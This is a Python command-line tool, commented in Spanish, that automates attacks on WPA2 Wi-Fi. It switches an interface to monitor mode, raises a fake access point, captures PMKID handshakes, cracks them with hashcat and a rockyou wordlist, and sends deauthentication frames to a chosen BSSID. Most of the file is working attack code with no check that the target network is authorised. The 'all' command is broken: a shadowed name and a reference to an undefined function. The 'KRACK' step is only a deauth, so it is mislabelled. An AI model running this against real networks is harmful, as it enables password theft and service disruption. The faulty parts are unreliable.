#!/usr/bin/env python3
"""
WPA2 / KRACK Automator – Smart CLI
=================================
CLI profesional con autodetección de interfaces, autoparcheo de *hostapd* y
*dnsmasq* y flujo interactivo para demos WPA-Personal y KRACK.

Características destacadas
-------------------------
* **Typer + Rich** → comandos claros, colores, tablas y spinners.
* Detecta/propone automáticamente las interfaces *monitor* y *AP*.
* Parchea al vuelo los ficheros *.conf* para que usen la interfaz elegida.
* Sub-comando `all` ejecuta el flujo completo pidiendo sólo lo necesario.

Instalación
-----------
```bash
pip install typer rich pyyaml
chmod +x wpa2lab_cli.py
```
"""
from __future__ import annotations

import logging
import re
import shutil
import subprocess
import itertools
import sys
import tempfile
from pathlib import Path
from typing import List, Optional

import typer
import yaml
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console(highlight=False)
app = typer.Typer(
    add_completion=False,
    help="Automatiza demos WPA-Personal / KRACK sin dolores de cabeza.",
)

SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = SCRIPT_DIR.parent
CFG_FILE = PROJECT_ROOT / "config.yaml"
DEFAULT_LOG = PROJECT_ROOT / "logs/wpa2lab.log"

# ---------------------------------------------------------------------------
# Configuración y logging
# ---------------------------------------------------------------------------

def load_config() -> dict:
    if CFG_FILE.exists():
        return yaml.safe_load(CFG_FILE.read_text()) or {}
    return {}

CFG = load_config()
DEFAULTS = CFG.get("defaults", {})  # {'monitor': 'wlan0', 'ap': 'wlan1'}

LOG_CFG = CFG.get("logging", {})
log_level = getattr(logging, LOG_CFG.get("level", "INFO").upper(), logging.INFO)
logging.basicConfig(
    filename=str(LOG_CFG.get("file", DEFAULT_LOG)),
    level=log_level,
    format="%(asctime)s %(levelname)s %(message)s",
)
log = logging.getLogger("wpa2lab")

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def run(cmd: List[str], sudo: bool = False, capture_output: bool = False) -> subprocess.CompletedProcess:
    """Wrapper de subprocess.run con log y sudo opcional."""
    full_cmd = ["sudo", *cmd] if sudo else cmd
    console.log(f"[cyan]$ {' '.join(full_cmd)}")
    log.info("%s", " ".join(full_cmd))
    return subprocess.run(full_cmd, check=True, capture_output=capture_output)


def ensure_tool(tool: str, pkg_hint: str | None = None) -> None:
    if shutil.which(tool):
        return
    hint = f" → sudo apt install {pkg_hint or tool}" if pkg_hint else ""
    console.print(f"[bold red]Error:[/] Falta la herramienta [yellow]{tool}[/].{hint}")
    raise typer.Exit(1)

# ---------- Interface helpers ----------

def get_wireless_ifaces() -> List[str]:
    out = subprocess.check_output(["iw", "dev"], text=True)
    return [m.group(1) for m in re.finditer(r"Interface\s+(\w+)", out)]


def auto_select_iface(role: str, exclude: Optional[List[str]] = None) -> Optional[str]:
    """Intenta elegir una interfaz razonable para *role* (monitor|ap)."""
    exclude = exclude or []
    if DEFAULTS.get(role):
        return DEFAULTS[role]

    wlans = [i for i in get_wireless_ifaces() if i not in exclude]
    if not wlans:
        return None

    if role == "monitor":
        for i in wlans:
            if i.endswith("mon"):
                return i[:-3]
    for i in wlans:
        if not i.endswith("mon"):
            return i
    return wlans[0][:-3] if wlans[0].endswith("mon") else wlans[0]


def resolve_iface(role: str, provided: Optional[str], exclude: Optional[List[str]] = None) -> str:
    """Devuelve la interfaz a usar, interactuando si es necesario."""
    if provided:
        return provided
    auto = auto_select_iface(role, exclude)
    if auto:
        console.print(f"[bold blue]Info:[/] Usando interfaz por defecto: [yellow]{auto}[/] (role={role})")
        return auto

    wlans = get_wireless_ifaces()
    if not wlans:
        console.print("[bold red]Error:[/] No se detectan interfaces Wi-Fi.")
        raise typer.Exit(1)

    table = Table(title="Interfaces Wi-Fi detectadas")
    table.add_column("#")
    table.add_column("Nombre")
    for idx, name in enumerate(wlans):
        table.add_row(str(idx), name)
    console.print(table)
    choice = typer.prompt(f"Selecciona nº de interfaz para {role}", default="0")
    try:
        return wlans[int(choice)]
    except (ValueError, IndexError):
        console.print("[bold red]Selección no válida.[/]")
        raise typer.Exit(1)


def current_monitor_iface() -> Optional[str]:
    out = subprocess.check_output(["iw", "dev"], text=True)
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+mon)", line)
        if m:
            return m.group(1)
    return None

# ---------- Config patch helpers ----------

def patch_config(template: Path, iface: str, tool: str) -> Path:
    """Copia temporal del *.conf* con interface=<iface>."""
    text = template.read_text()
    if "interface=" in text:
        text = re.sub(r"^interface=.*$", f"interface={iface}", text, flags=re.MULTILINE)
    else:
        text = f"interface={iface}\n{text}"
    tmp_path = Path(tempfile.gettempdir()) / f"{tool}_{iface}.conf"
    tmp_path.write_text(text)
    return tmp_path

# ---------------------------------------------------------------------------
# Commands
# ---------------------------------------------------------------------------

@app.command()
def prepare(
    monitor: Optional[str] = typer.Option(None, "--monitor", "-m", help="Interfaz para modo monitor"),
) -> None:
    """Activa el modo monitor."""
    monitor = resolve_iface("monitor", monitor)
    console.print(Panel.fit("[bold]Modo monitor[/bold]", style="green"))
    run(["airmon-ng", "check", "kill"], sudo=True)
    try:
        run(["airmon-ng", "start", monitor], sudo=True)
    except subprocess.CalledProcessError as exc:
        console.print(f"[bold red]Error:[/] {monitor} no soporta monitor mode")
        raise typer.Exit(exc.returncode)
    console.print(f"[bold green]✓[/] Modo monitor activado en [yellow]{monitor}mon[/]")


@app.command()
def ap(
    ap: Optional[str] = typer.Option(None, "--ap", "-a", help="Interfaz gestionada para fake-AP"),
) -> None:
    """Levanta un AP falso con hostapd + dnsmasq."""
    ap = resolve_iface("ap", ap, exclude=[DEFAULTS.get("monitor", "")])
    console.print(Panel.fit("[bold]Fake AP[/bold]", style="green"))

    run(["ip", "link", "set", ap, "up"], sudo=True)
    run(["ip", "addr", "flush", "dev", ap], sudo=True)
    run(["ip", "addr", "add", "10.0.0.1/24", "dev", ap], sudo=True)

    subprocess.run(["sudo", "killall", "hostapd"], check=False)
    subprocess.run(["sudo", "killall", "dnsmasq"], check=False)

    hapd_conf = patch_config(PROJECT_ROOT / "hostapd/hostapd.conf", ap, "hostapd")
    dns_conf = patch_config(PROJECT_ROOT / "dnsmasq/dnsmasq.conf", ap, "dnsmasq")

    console.print(f"[bold green]•[/] hostapd → {hapd_conf}")
    run(["hostapd", "-B", str(hapd_conf)], sudo=True)

    console.print(f"[bold green]•[/] dnsmasq → {dns_conf}")
    run(["dnsmasq", "-C", str(dns_conf)], sudo=True)

    console.print(f"[bold green]✓[/] AP falso listo en 10.0.0.1/24 vía [yellow]{ap}[/]")


@app.command()
def capture() -> None:
    """Captura PMKID con hcxdumptool."""
    ensure_tool("hcxdumptool", "hcxdumptool")
    mon_iface = current_monitor_iface()
    if not mon_iface:
        console.print("[bold red]Error:[/] No hay interfaz monitor. Ejecuta 'prepare'.")
        raise typer.Exit(1)
    pcap = PROJECT_ROOT / CFG.get("paths", {}).get("pcap", "dump.pcapng")
    console.print(Panel.fit(f"[bold]Capturando PMKID[/bold] → {pcap}", style="green"))
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), transient=True, console=console) as progress:
        progress.add_task("Escuchando… (CTRL-C para detener)")
        try:
            run(["hcxdumptool", "-i", mon_iface, "-w", str(pcap)], sudo=True)
        except KeyboardInterrupt:
            pass


@app.command()
def extract() -> None:
    """Extrae el hash (mode 22000) con hcxpcapngtool."""
    ensure_tool("hcxpcapngtool", "hcxtools")
    pcap = PROJECT_ROOT / CFG.get("paths", {}).get("pcap", "dump.pcapng")
    hashf = PROJECT_ROOT / CFG.get("paths", {}).get("hash", "hash.22000")
    console.print(Panel.fit("[bold]Extrayendo hash[/bold]", style="green"))
    console.print(f"[bold green]•[/] {pcap} → {hashf}")
    run(["hcxpcapngtool", "-o", str(hashf), str(pcap)])
    console.print(f"[bold green]✓[/] Hash listo en {hashf}")

@app.command("crack")
def cmd_crack(
    auto: bool = typer.Option(
        False, "--auto", "-a",
        help="Modo automático: no preguntar entre bloques, seguir hasta el final"
    ),
    chunk_size: int = typer.Option(50000, "--chunk", "-c", help="Líneas por bloque")
):
    """
    Crack interactivo por bloques (o en modo automático).
    """
    tool = "hashcat"
    ensure_tool(tool, "hashcat")

    hashf = PROJECT_ROOT / CFG.get("paths", {}).get("hash", "hash.22000")
    wordl = Path(CFG.get("paths", {}).get("wordlist", "/usr/share/wordlists/rockyou.txt"))

    if not wordl.exists():
        console.print(f"[bold red]¡No existe la wordlist:[/bold red] {wordl}")
        raise typer.Exit(1)

    console.print(f"[blue]🔍 Wordlist:[/] {wordl} ({chunk_size} líneas por bloque){' — MODO AUTO' if auto else ''}")

    with wordl.open("r", errors="ignore") as wl:
        block = list(itertools.islice(wl, chunk_size))
        block_index = 1

        while block:
            console.print(Panel.fit(f"[bold]Bloque {block_index}[/bold] — probando {len(block)} contraseñas…", style="cyan"))

            # crear temp con este bloque
            tmp = tempfile.NamedTemporaryFile("w+", delete=False)
            tmp.write("\n".join(line.rstrip("\n") for line in block))
            tmp.flush(); tmp.close()

            # lanzar hashcat en quiet
            proc = subprocess.run(
                [tool, "-m", "22000", str(hashf), tmp.name, "--quiet"],
                capture_output=True, text=True, check=False
            )
            if proc.returncode not in (0, 1):
                console.print(f"[bold red]Error:[/] hashcat devolvió {proc.returncode}. Abortando.")
                return

            # mostrar lo hallado hasta ahora
            show = subprocess.run(
                [tool, "-m", "22000", "--show", str(hashf)],
                capture_output=True, text=True
            ).stdout.strip()
            if show:
                console.print(Panel.fit("[green]✓ Contraseñas encontradas hasta ahora[/green]", title="Resultados"))
                for line in show.splitlines():
                    _, pwd = line.split(":", 1)
                    console.print(f"[green]•[/green] {pwd}")
            else:
                console.print(Panel.fit("[yellow]– Ninguna contraseña en este bloque[/yellow]"))

            # decidir si seguir
            if not auto:
                if not typer.confirm("¿Continuar con el siguiente bloque?"):
                    console.print("[blue]✔ Crack detenido por el usuario.[/blue]")
                    break
            # en modo auto, simplemente seguimos

            # preparar siguiente bloque
            block = list(itertools.islice(wl, chunk_size))
            block_index += 1
        else:
            console.print("[green]✓ Has probado toda la word-list.[/green]")


@app.command()
def krack(
    bssid: str = typer.Argument(..., help="BSSID objetivo para la demo KRACK (AA:BB:CC:DD:EE:FF)"),
) -> None:
    """Envía un paquete de desautenticación para forzar retransmisión del nonce."""
    ensure_tool("aireplay-ng", "aircrack-ng")
    mon_iface = current_monitor_iface()
    if not mon_iface:
        console.print("[bold red]Error:[/] No hay interfaz monitor. Ejecuta 'prepare'.")
        raise typer.Exit(1)
    console.print(Panel.fit("[bold]KRACK demo[/bold]", style="green"))
    console.print(f"[bold green]•[/] BSSID: [yellow]{bssid}[/]  IFACE: [yellow]{mon_iface}[/]")
    run(["aireplay-ng", "-0", "1", "-a", bssid, mon_iface], sudo=True)
    console.print("[bold green]✓[/] Paquete de desautenticación enviado")


@app.command()
def all(
    monitor: Optional[str] = typer.Option(None, "--monitor", "-m", help="Interfaz monitor"),
    ap: Optional[str] = typer.Option(None, "--ap", "-a", help="Interfaz AP gestionada"),
    bssid: Optional[str] = typer.Argument(None, help="BSSID objetivo para KRACK"),
) -> None:
    """Ejecuta todo el flujo: prepare → ap → capture → extract → crack → krack."""
    monitor = resolve_iface("monitor", monitor)
    ap = resolve_iface("ap", ap, exclude=[monitor])
    steps = [
        ("prepare", "Activar modo monitor"),
        ("ap", "Levantar fake-AP"),
        ("capture", "Capturar PMKID"),
        ("extract", "Extraer hash 22000"),
        ("crack", "Crackear offline"),
        ("krack", "KRACK nonce"),
    ]
    table = Table(title="Flujo completo", show_header=True, header_style="bold magenta")
    for step, desc in steps:
        table.add_row(step, desc)
    console.print(table)

    prepare.callback(monitor)  # type: ignore[arg-type]
    ap.callback(ap)            # type: ignore[arg-type]
    capture.callback()         # type: ignore[arg-type]
    extract.callback()         # type: ignore[arg-type]
    crack.callback()           # type: ignore[arg-type]

    if bssid is None:
        bssid = typer.prompt("Introduce BSSID para KRACK", default="00:11:22:33:44:55")
    krack.callback(bssid)      # type: ignore[arg-type]

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    try:
        app()
    except KeyboardInterrupt:
        console.print("\n[bold yellow]¡Interrumpido por el usuario![/]")
